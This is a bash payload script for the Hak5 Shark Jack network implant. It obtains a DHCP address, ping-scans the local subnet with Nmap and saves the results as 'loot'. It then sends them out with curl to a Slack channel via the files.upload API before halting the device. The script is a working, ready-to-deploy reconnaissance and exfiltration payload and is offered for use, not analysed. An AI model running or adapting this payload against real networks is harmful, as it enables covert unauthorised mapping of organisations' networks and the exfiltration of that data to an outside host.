#!/bin/bash
#
# Title:         Nmap Payload with Slack exfiltration
# Author:        Deviant (Based on the orignial Hak5 sample payload)
# Version:       1.0
#
# Scans target subnet with Nmap using specified options. Saves each scan result
# to loot storage folder and then uploads it to Slack to a channel of your choice. 
#
# This payload requires you to install curl via opkg and have a slack token generated.
# You should also specify the channel... For this example the channel name is just 'shark'.
# There's also a Danganronpa reference in this script.. That's important to mention.
#
# Red ...........Setup
# Amber..........Scanning
# Green..........Finished
#
# See nmap --help for options. Default "-sP" ping scans the address space for
# fast host discovery.

NMAP_OPTIONS="-sP"
LOOT_DIR=/root/loot/nmap
SCAN_DIR=/etc/shark/nmap
SLACKTOKEN=""


function finish() {
	LED CLEANUP
	# Kill Nmap
	wait $1
	kill $1 &> /dev/null

	# Sync filesystem
	echo $SCAN_M > $SCAN_FILE
	sync
	sleep 1
 
	# Upload the loot to Slack
	slack
	sleep 1

	LED FINISH
	sleep 1

	# Halt system
	halt
}

function setup() {
	LED SETUP
	# Create loot directory
	mkdir -p $LOOT_DIR &> /dev/null
	
	# Set NETMODE to DHCP_CLIENT for Shark Jack v1.1.0+
	NETMODE DHCP_CLIENT
	# Wait for an IP address to be obtained
	while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

	# Create tmp scan directory
	mkdir -p $SCAN_DIR &> /dev/null

	# Create tmp scan file if it doesn't exist
	SCAN_FILE=$SCAN_DIR/scan-count
	if [ ! -f $SCAN_FILE ]; then
		touch $SCAN_FILE && echo 0 > $SCAN_FILE
	fi

	# Find IP address and subnet
	while [ -z "$SUBNET" ]; do
		sleep 1 && find_subnet
	done
}

function find_subnet() {
	SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}" | sed 's/\.[0-9]*\//\.0\//')
}

function run() {
	# Run setup
	setup

	# Preflight NMAP
	SCAN_N=$(cat $SCAN_FILE)
	SCAN_M=$(( $SCAN_N + 1 ))

	LED ATTACK
	# Start scan
	nmap $NMAP_OPTIONS $SUBNET -oN $LOOT_DIR/nmap-scan_$SCAN_M.txt &>/dev/null &
	tpid=$!
	finish $tpid
}

function slack() {
		# Curl magic 
		curl \
		-F file=@$LOOT_DIR/nmap-scan_$SCAN_M.txt \
	        -F initial_comment="A network has been discovered!" \
		-F channels=#shark \
		-F token=${SLACKTOKEN} \
	    https://slack.com/api/files.upload
}

# Run payload
run &
